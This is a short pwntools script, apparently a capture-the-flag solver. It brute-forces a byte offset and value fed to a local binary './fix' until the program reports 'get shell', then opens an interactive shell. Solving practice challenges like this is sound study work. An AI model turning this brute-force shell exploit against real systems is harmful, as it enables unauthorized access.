from pwn import *

for i in range(23):
  for v in range(256):
    print(str(i) + ' ' + str(v))
    p = process('./fix')
    p.sendline(str(i).encode('utf-8'))
    p.sendline(str(v).encode('utf-8'))
    p.recvuntil('get shell')
    try:
      p.sendline(b'pwd')
      print(p.recvuntil(b'/home/'))
      p.interactive()
    except:
      p.close()
      continue
